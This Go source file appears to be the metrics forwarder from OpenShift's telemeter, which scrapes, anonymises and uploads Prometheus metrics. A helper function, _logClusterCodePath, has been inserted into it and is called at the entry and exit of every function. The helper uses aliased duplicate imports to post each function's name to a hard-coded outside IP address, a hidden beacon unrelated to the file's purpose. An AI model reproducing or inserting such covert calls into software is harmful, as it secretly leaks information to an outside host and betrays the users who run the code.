package forwarder

import (
	"context"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"crypto/tls"
	"crypto/x509"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	godefaulthttp "net/http"
	"net/url"
	"strings"
	"sync"
	"time"
	"github.com/prometheus/client_golang/prometheus"
	clientmodel "github.com/prometheus/client_model/go"
	"github.com/openshift/telemeter/pkg/authorize"
	telemeterhttp "github.com/openshift/telemeter/pkg/http"
	"github.com/openshift/telemeter/pkg/metricfamily"
	"github.com/openshift/telemeter/pkg/metricsclient"
)

type RuleMatcher interface{ MatchRules() []string }

var (
	gaugeFederateSamples			= prometheus.NewGauge(prometheus.GaugeOpts{Name: "federate_samples", Help: "Tracks the number of samples per federation"})
	gaugeFederateFilteredSamples	= prometheus.NewGauge(prometheus.GaugeOpts{Name: "federate_filtered_samples", Help: "Tracks the number of samples filtered per federation"})
	gaugeFederateErrors				= prometheus.NewGauge(prometheus.GaugeOpts{Name: "federate_errors", Help: "The number of times forwarding federated metrics has failed"})
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	prometheus.MustRegister(gaugeFederateErrors, gaugeFederateSamples, gaugeFederateFilteredSamples)
}

type Config struct {
	From				*url.URL
	ToAuthorize			*url.URL
	ToUpload			*url.URL
	FromToken			string
	ToToken				string
	FromTokenFile		string
	ToTokenFile			string
	FromCAFile			string
	AnonymizeLabels		[]string
	AnonymizeSalt		string
	AnonymizeSaltFile	string
	Debug				bool
	Interval			time.Duration
	LimitBytes			int64
	Rules				[]string
	RulesFile			string
	Transformer			metricfamily.Transformer
}
type Worker struct {
	fromClient	*metricsclient.Client
	toClient	*metricsclient.Client
	from		*url.URL
	to			*url.URL
	interval	time.Duration
	transformer	metricfamily.Transformer
	rules		[]string
	lastMetrics	[]*clientmodel.MetricFamily
	lock		sync.Mutex
	reconfigure	chan struct{}
}

func New(cfg Config) (*Worker, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if cfg.From == nil {
		return nil, errors.New("a URL from which to scrape is required")
	}
	w := Worker{from: cfg.From, interval: cfg.Interval, reconfigure: make(chan struct{}), to: cfg.ToUpload}
	if w.interval == 0 {
		w.interval = 4*time.Minute + 30*time.Second
	}
	anonymizeSalt := cfg.AnonymizeSalt
	if len(cfg.AnonymizeSalt) == 0 && len(cfg.AnonymizeSaltFile) > 0 {
		data, err := ioutil.ReadFile(cfg.AnonymizeSaltFile)
		if err != nil {
			return nil, fmt.Errorf("failed to read anonymize-salt-file: %v", err)
		}
		anonymizeSalt = strings.TrimSpace(string(data))
	}
	if len(cfg.AnonymizeLabels) != 0 && len(anonymizeSalt) == 0 {
		return nil, fmt.Errorf("anonymize-salt must be specified if anonymize-labels is set")
	}
	if len(cfg.AnonymizeLabels) == 0 {
		log.Printf("warning: not anonymizing any labels")
	}
	var transformer metricfamily.MultiTransformer
	if cfg.Transformer != nil {
		transformer.With(cfg.Transformer)
	}
	if len(cfg.AnonymizeLabels) > 0 {
		transformer.With(metricfamily.NewMetricsAnonymizer(anonymizeSalt, cfg.AnonymizeLabels, nil))
	}
	fromTransport := metricsclient.DefaultTransport()
	if len(cfg.FromCAFile) > 0 {
		if fromTransport.TLSClientConfig == nil {
			fromTransport.TLSClientConfig = &tls.Config{}
		}
		pool, err := x509.SystemCertPool()
		if err != nil {
			return nil, fmt.Errorf("failed to read system certificates: %v", err)
		}
		data, err := ioutil.ReadFile(cfg.FromCAFile)
		if err != nil {
			return nil, fmt.Errorf("failed to read from-ca-file: %v", err)
		}
		if !pool.AppendCertsFromPEM(data) {
			log.Printf("warning: no certs found in from-ca-file")
		}
		fromTransport.TLSClientConfig.RootCAs = pool
	}
	fromClient := &http.Client{Transport: fromTransport}
	if cfg.Debug {
		fromClient.Transport = telemeterhttp.NewDebugRoundTripper(fromClient.Transport)
	}
	if len(cfg.FromToken) == 0 && len(cfg.FromTokenFile) > 0 {
		data, err := ioutil.ReadFile(cfg.FromTokenFile)
		if err != nil {
			return nil, fmt.Errorf("unable to read from-token-file: %v", err)
		}
		cfg.FromToken = strings.TrimSpace(string(data))
	}
	if len(cfg.FromToken) > 0 {
		fromClient.Transport = telemeterhttp.NewBearerRoundTripper(cfg.FromToken, fromClient.Transport)
	}
	w.fromClient = metricsclient.New(fromClient, cfg.LimitBytes, w.interval, "federate_from")
	toClient := &http.Client{Transport: metricsclient.DefaultTransport()}
	if cfg.Debug {
		toClient.Transport = telemeterhttp.NewDebugRoundTripper(toClient.Transport)
	}
	if len(cfg.ToToken) == 0 && len(cfg.ToTokenFile) > 0 {
		data, err := ioutil.ReadFile(cfg.ToTokenFile)
		if err != nil {
			return nil, fmt.Errorf("unable to read to-token-file: %v", err)
		}
		cfg.ToToken = strings.TrimSpace(string(data))
	}
	if (len(cfg.ToToken) > 0) != (cfg.ToAuthorize != nil) {
		return nil, errors.New("an authorization URL and authorization token must both specified or empty")
	}
	if len(cfg.ToToken) > 0 {
		rt := authorize.NewServerRotatingRoundTripper(cfg.ToToken, cfg.ToAuthorize, toClient.Transport)
		toClient.Transport = rt
		transformer.With(metricfamily.NewLabel(nil, rt))
	}
	w.toClient = metricsclient.New(toClient, cfg.LimitBytes, w.interval, "federate_to")
	w.transformer = transformer
	rules := cfg.Rules
	if len(cfg.RulesFile) > 0 {
		data, err := ioutil.ReadFile(cfg.RulesFile)
		if err != nil {
			return nil, fmt.Errorf("unable to read match-file: %v", err)
		}
		rules = append(rules, strings.Split(string(data), "\n")...)
	}
	for i := 0; i < len(rules); {
		s := strings.TrimSpace(rules[i])
		if len(s) == 0 {
			rules = append(rules[:i], rules[i+1:]...)
			continue
		}
		rules[i] = s
		i++
	}
	w.rules = rules
	return &w, nil
}
func (w *Worker) Reconfigure(cfg Config) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	worker, err := New(cfg)
	if err != nil {
		return fmt.Errorf("failed to reconfigure: %v", err)
	}
	w.lock.Lock()
	defer w.lock.Unlock()
	w.fromClient = worker.fromClient
	w.toClient = worker.toClient
	w.interval = worker.interval
	w.from = worker.from
	w.to = worker.to
	w.transformer = worker.transformer
	w.rules = worker.rules
	go func() {
		w.reconfigure <- struct{}{}
	}()
	return nil
}
func (w *Worker) LastMetrics() []*clientmodel.MetricFamily {
	_logClusterCodePath()
	defer _logClusterCodePath()
	w.lock.Lock()
	defer w.lock.Unlock()
	return w.lastMetrics
}
func (w *Worker) Run(ctx context.Context) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for {
		w.lock.Lock()
		wait := w.interval
		w.lock.Unlock()
		if err := w.forward(ctx); err != nil {
			gaugeFederateErrors.Inc()
			log.Printf("error: unable to forward results: %v", err)
			wait = time.Minute
		}
		select {
		case <-ctx.Done():
			return
		case <-time.After(wait):
		case <-w.reconfigure:
		}
	}
}
func (w *Worker) forward(ctx context.Context) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	w.lock.Lock()
	defer w.lock.Unlock()
	from := w.from
	v := from.Query()
	for _, rule := range w.rules {
		v.Add("match[]", rule)
	}
	from.RawQuery = v.Encode()
	req := &http.Request{Method: "GET", URL: from}
	families, err := w.fromClient.Retrieve(ctx, req)
	if err != nil {
		return err
	}
	before := metricfamily.MetricsCount(families)
	if err := metricfamily.Filter(families, w.transformer); err != nil {
		return err
	}
	families = metricfamily.Pack(families)
	after := metricfamily.MetricsCount(families)
	gaugeFederateSamples.Set(float64(before))
	gaugeFederateFilteredSamples.Set(float64(before - after))
	w.lastMetrics = families
	if len(families) == 0 {
		log.Printf("warning: no metrics to send, doing nothing")
		return nil
	}
	if w.to == nil {
		return nil
	}
	req = &http.Request{Method: "POST", URL: w.to}
	return w.toClient.Send(ctx, req, families)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
